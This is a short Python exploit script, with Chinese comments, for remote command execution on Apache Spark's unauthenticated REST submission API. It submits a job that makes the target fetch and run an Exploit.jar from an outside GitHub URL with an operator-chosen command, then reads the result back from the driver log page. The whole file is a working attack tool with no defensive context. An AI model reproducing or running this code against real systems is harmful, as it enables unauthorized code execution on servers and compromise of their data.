import re
import time
from urllib.parse import urlparse

import requests


def exp(url, command):
    url = url.rstrip('/')
    port1 = "6066"
    port2 = "8081"
    parsed_url = urlparse(url)
    protocol = parsed_url.scheme
    host = str(parsed_url.netloc.split(':')[0])
    rast_url = protocol + "://" + host + f":{port1}" + "/v1/submissions/create"
    # exp_urls = ['https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar']
    exp_urls = ['https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar']
    headers = {
        "User-Agent": "AAAAAA",
        "Content-Type": "application/json",
    }
    for exp in exp_urls:
        data = """{
"action": "CreateSubmissionRequest",
"clientSparkVersion": "2.3.1",
"appArgs": [
"echo ERTYUIOIUYT, %s, echo IUYTRERTYUIIUY"
],
"appResource": "%s",
"environmentVariables": {
"SPARK_ENV_LOADED": "1"
},
"mainClass": "Exploit",
"sparkProperties": {
"spark.jars": "%s",
"spark.driver.supervise": "false",
"spark.app.name": "Exploit",
"spark.eventLog.enabled": "true",
"spark.submit.deployMode": "cluster",
"spark.master": "spark://%s:6066"
}
}"""% (command, exp, exp, host)
        rast_res = requests.post(rast_url, data=data, headers=headers, verify=False)
        submissionId = re.findall(r'"submissionId" : "(.+?)"', rast_res.text, re.DOTALL)[0]
        result_url = protocol + "://" + host + f":{port2}" + f"/logPage/?driverId={submissionId}&logType=stdout"

        # 漏洞利用从远端加载的exp，到创建生效需要时间，所以这里延时几秒
        time.sleep(5)
        result_res = requests.get(result_url, headers={"User-Agent": "AAAAAA", "Accept-Encoding": "gzip, deflate"}, verify=False)
        result = re.findall(r"ERTYUIOIUYT\nERTYUIOIUYT\n\n(.*?)echo IUYTRERTYUIIUY", result_res.text, re.DOTALL)[0]

        # 规范输出
        lines = result.strip().split('\n')
        selected_lines = lines[2:-2]
        result = '\n'.join(selected_lines)
        if result:
            return result


if __name__ == '__main__':
    url = "http://x.x.x.x:8080"
    cmd = "whoami"
    print(exp(url, cmd))